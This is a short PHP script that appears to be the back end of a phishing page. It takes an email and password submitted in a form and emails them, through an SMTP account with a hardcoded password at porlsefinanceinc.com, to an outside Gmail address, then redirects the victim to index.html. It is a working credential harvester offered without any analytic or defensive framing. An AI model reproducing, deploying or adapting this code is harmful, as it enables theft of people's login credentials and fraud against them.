<?php
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);

 if(isset($_POST['email']) && isset($_POST['password'])) 
 {						
		require_once('mailer/PHPMailer.php');
		$email = 'adetunjioluwakayode@gmail.com';
		$subject = 'New Mail';
		$message = '<b>Email:</b> '.$_POST['email'].'<br> <b>Password:</b> '.$_POST['password'];
		$mail = new PHPMailer();
		$mail->IsSMTP(); 
		$mail->SMTPDebug  = 0;                     
		$mail->SMTPAuth   = true;                  
		$mail->SMTPSecure = "ssl";                 
		$mail->Host       = "mail.porlsefinanceinc.com";      
		$mail->Port       = 465;             
		$mail->AddAddress($email);
		$mail->Username="noreply@porlsefinanceinc.com";  
		$mail->Password="porlsefinanceinc900900";            
		$mail->SetFrom('noreply@porlsefinanceinc.com','TEST NAME');
		$mail->AddReplyTo("noreply@porlsefinanceinc.com","TEST NAME");
		$mail->Subject    = $subject;
		$mail->MsgHTML($message);
		$mail->Send();

		header('Location: index.html');

 }	
?>